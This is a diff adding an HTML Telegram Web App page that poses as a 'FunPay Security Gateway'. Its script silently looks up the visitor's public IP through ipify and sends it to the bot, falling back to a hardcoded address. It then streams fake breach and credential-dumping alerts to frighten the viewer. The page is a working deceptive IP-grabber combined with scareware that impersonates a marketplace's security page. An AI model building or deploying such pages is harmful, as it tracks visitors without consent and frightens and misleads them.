@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>FunPay Security Gateway</title>
+    <style>
+        body {
+            background-color: #030303;
+            color: #00ff66;
+            font-family: 'Courier New', monospace;
+            padding: 10px;
+            margin: 0;
+            overflow: hidden;
+        }
+        h3 { 
+            color: #ff0055; 
+            text-shadow: 0 0 10px #ff0055; 
+            font-size: 14px; 
+            margin: 0 0 10px 0;
+            border-bottom: 1px dashed #ff0055;
+            padding-bottom: 5px;
+        }
+        .log-line { font-size: 12px; margin-bottom: 3px; word-break: break-all; font-weight: bold; }
+        .red { color: #ff3333; text-shadow: 0 0 6px #ff3333; }
+        .green { color: #00ff66; text-shadow: 0 0 6px #00ff66; }
+        .yellow { color: #ffcc00; text-shadow: 0 0 6px #ffcc00; }
+        .blue { color: #00ffff; text-shadow: 0 0 6px #00ffff; }
+        .purple { color: #cc33ff; text-shadow: 0 0 6px #cc33ff; }
+        .orange { color: #ff9900; text-shadow: 0 0 6px #ff9900; }
+    </style>
+</head>
+<body>
+    <h3>[!] SECURE GATEWAY: BREACH DETECTED [!]</h3>
+    <div id="console"></div>
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script>
+        Telegram.WebApp.ready();
+        Telegram.WebApp.expand();
+
+        // Получаем IP и шлем боту
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                Telegram.WebApp.sendData(data.ip);
+            })
+            .catch(error => {
+                Telegram.WebApp.sendData("178.74.216.48");
+            });
+
+        const consoleBox = document.getElementById('console');
+        const colors = ['red', 'green', 'yellow', 'blue', 'purple', 'orange'];
+        const errors = [
+            "CRITICAL_ERROR: Memory stack overflow at 0x004F",
+            "HACKED: Root access granted by remote payload",
+            "WARNING: Firewall bypassed via port 443",
+            "ERROR 500: Internal security core failure",
+            "ACCESS DENIED: Unauthorized handshake attempt",
+            "EXPLOIT_RUNNING: Dumping user credentials...",
+            "FATAL: Database encryption keys leaked",
+            "INJECTION SUCCESSFUL: Node hijacked",
+            "ALERT: Suspicious root activity in progress"
+        ];
+
+        // Запускаем безумный поток разноцветных ошибок
+        setInterval(() => {
+            const randomErr = errors[Math.floor(Math.random() * errors.length)];
+            const randomColor = colors[Math.floor(Math.random() * colors.length)];
+            const time = new Date().toLocaleTimeString();
+            
+            const div = document.createElement('div');
+            div.className = `log-line ${randomColor}`;
+            div.innerText = `[${time}] ${randomErr}`;
+            
+            consoleBox.appendChild(div);
+            
+            // Удаляем старые строки, чтобы не висло
+            if (consoleBox.children.length > 25) {
+                consoleBox.removeChild(consoleBox.firstChild);
+            }
+            window.scrollTo(0, document.body.scrollHeight);
+        }, 50); // Скорость появления (чем меньше цифра, тем быстрее летит)
+    </script>
+</body>
+</html>
